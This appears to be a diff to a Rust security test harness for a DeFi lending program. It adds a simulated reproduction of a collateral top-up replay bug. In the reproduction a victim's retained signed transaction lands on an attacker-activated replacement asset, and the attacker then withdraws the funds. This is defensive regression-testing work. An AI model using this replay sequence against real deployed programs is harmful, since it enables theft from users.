@@ -86,10 +86,11 @@ pub enum KnownBlocker {
     ResolveBeforeCommittedAccrual,
     BilateralFeeSupport,
     DelayedAssetAuthorityRevival,
+    CollateralTopUpGenerationReplay,
 }
 
 impl KnownBlocker {
-    pub const COUNT: usize = 30;
+    pub const COUNT: usize = 31;
 
     pub const fn index(self) -> usize {
         match self {
@@ -123,6 +124,7 @@ impl KnownBlocker {
             Self::ResolveBeforeCommittedAccrual => 27,
             Self::BilateralFeeSupport => 28,
             Self::DelayedAssetAuthorityRevival => 29,
+            Self::CollateralTopUpGenerationReplay => 30,
         }
     }
 }
@@ -516,6 +518,17 @@ pub struct DelayedAssetAuthorityRevivalReproduction {
     pub funded_reserve: u128,
     pub reserve_after: u128,
     pub handoff_cu: u64,
+    pub withdrawal_cu: u64,
+}
+
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct CollateralTopUpGenerationReplayReproduction {
+    pub blocker: KnownBlocker,
+    pub old_market_id: u64,
+    pub new_market_id: u64,
+    pub victim_loss: u64,
+    pub attacker_extraction: u64,
+    pub replay_cu: u64,
     pub withdrawal_cu: u64,
 }
 
@@ -1639,7 +1652,7 @@ impl ScenarioRunner {
                     != engine_asset.effective_price
                     || profile.mark_ewma_e6 != engine_asset.effective_price;
                 let has_loss_currentness_lag = asset_contributes_to_loss_stale(engine_asset)
-                    && group.current_slot > engine_asset.slot_last;
+                    && self.env.current_slot() > engine_asset.slot_last;
                 (has_price_delta || has_loss_currentness_lag)
                     && self.env.current_slot() > engine_asset.slot_last
             })
@@ -4661,6 +4674,109 @@ pub fn reproduce_delayed_asset_authority_revival(
         funded_reserve,
         reserve_after,
         handoff_cu: handoff.compute_units,
+        withdrawal_cu: withdrawal.compute_units,
+    })
+}
+
+pub fn reproduce_collateral_top_up_generation_replay(
+    seed: [u8; 32],
+) -> Result<CollateralTopUpGenerationReplayReproduction, String> {
+    const ASSET: u16 = 1;
+    const DOMAIN: u16 = ASSET * 2;
+    const VICTIM: usize = 0;
+    const ATTACKER: usize = 1;
+    const AMOUNT: u128 = 250_000;
+
+    let mut env = V16Svm::new(seed, MarketConfig::default());
+    let supply_before = env.token_supply_observed();
+    let victim_source = env.actors[VICTIM].source_token;
+    let attacker_destination = env.actors[ATTACKER].destination_token;
+    let victim_source_before = env.token_amount(victim_source);
+    let attacker_destination_before = env.token_amount(attacker_destination);
+
+    env.update_asset_authority_from_admin(
+        ASSET,
+        percolator_prog::processor::ASSET_AUTH_INSURANCE,
+        VICTIM,
+    )
+    .map_err(|error| format!("PR 279 install old-generation insurance authority: {error}"))?;
+    let old_market_id = env.primary_market_state().1.assets[ASSET as usize].market_id;
+    let retained_top_up =
+        env.build_retained_insurance_domain_top_up_for_actor(VICTIM, DOMAIN, AMOUNT);
+
+    env.update_market_init_fee_policy(1)
+        .map_err(|error| format!("PR 279 configure permissionless init fee: {error}"))?;
+    env.warp_to_slot(2);
+    env.retire_asset(ASSET, 2)
+        .map_err(|error| format!("PR 279 retire old asset generation: {error}"))?;
+    env.warp_to_slot(3);
+    env.activate_permissionless_asset_with_actor_authorities(
+        ATTACKER, ASSET, 3, 2_000_000, VICTIM, ATTACKER, ATTACKER, ATTACKER, 1,
+    )
+    .map_err(|error| format!("PR 279 activate attacker-controlled replacement: {error}"))?;
+    let new_market_id = env.primary_market_state().1.assets[ASSET as usize].market_id;
+    if new_market_id == old_market_id {
+        return Err(format!(
+            "PR 279 replacement reused asset market ID {old_market_id}"
+        ));
+    }
+    let replacement_profile = env.primary_profile(ASSET as usize);
+    if replacement_profile.insurance_authority != env.actors[VICTIM].signer.pubkey().to_bytes()
+        || replacement_profile.insurance_operator != env.actors[ATTACKER].signer.pubkey().to_bytes()
+    {
+        return Err(
+            "PR 279 replacement authorities did not match the signed replay premise".into(),
+        );
+    }
+
+    let replay = env
+        .land_retained(retained_top_up)
+        .map_err(|error| format!("PR 279 stale collateral top-up no longer lands: {error}"))?;
+    let victim_loss = victim_source_before
+        .checked_sub(env.token_amount(victim_source))
+        .ok_or("PR 279 victim source increased")?;
+    let replayed_reserve = env.primary_market_state().1.insurance_domain_budget[DOMAIN as usize];
+    if victim_loss != AMOUNT as u64 || replayed_reserve != AMOUNT {
+        return Err(format!(
+            "PR 279 retained top-up did not fund replacement: victim_loss={victim_loss}, \
+             reserve={replayed_reserve}"
+        ));
+    }
+
+    let withdrawal = env
+        .withdraw_insurance_asset(ATTACKER, ASSET, AMOUNT)
+        .map_err(|error| {
+            format!("PR 279 replacement operator could not extract replay: {error}")
+        })?;
+    let attacker_extraction = env
+        .token_amount(attacker_destination)
+        .checked_sub(attacker_destination_before)
+        .ok_or("PR 279 attacker destination decreased")?;
+    let reserve_after = env.primary_market_state().1.insurance_domain_budget[DOMAIN as usize];
+    if attacker_extraction != AMOUNT as u64
+        || reserve_after != 0
+        || replay.compute_units >= TX_CU_LIMIT
+        || withdrawal.compute_units >= TX_CU_LIMIT
+        || env.token_supply_observed() != supply_before
+    {
+        return Err(format!(
+            "PR 279 public extraction conditions failed: victim_loss={victim_loss}, \
+             attacker_extraction={attacker_extraction}, reserve={replayed_reserve}->{reserve_after}, \
+             replay_cu={}, withdrawal_cu={}, supply={}/{}",
+            replay.compute_units,
+            withdrawal.compute_units,
+            env.token_supply_observed(),
+            supply_before
+        ));
+    }
+
+    Ok(CollateralTopUpGenerationReplayReproduction {
+        blocker: KnownBlocker::CollateralTopUpGenerationReplay,
+        old_market_id,
+        new_market_id,
+        victim_loss,
+        attacker_extraction,
+        replay_cu: replay.compute_units,
         withdrawal_cu: withdrawal.compute_units,
     })
 }
@@ -7707,6 +7823,11 @@ pub fn bilateral_fee_support_strategy(
 
 #[allow(dead_code)]
 pub fn delayed_asset_authority_revival_seed_strategy() -> impl Strategy<Value = [u8; 32]> {
+    any::<[u8; 32]>()
+}
+
+#[allow(dead_code)]
+pub fn collateral_top_up_generation_replay_seed_strategy() -> impl Strategy<Value = [u8; 32]> {
     any::<[u8; 32]>()
 }
 
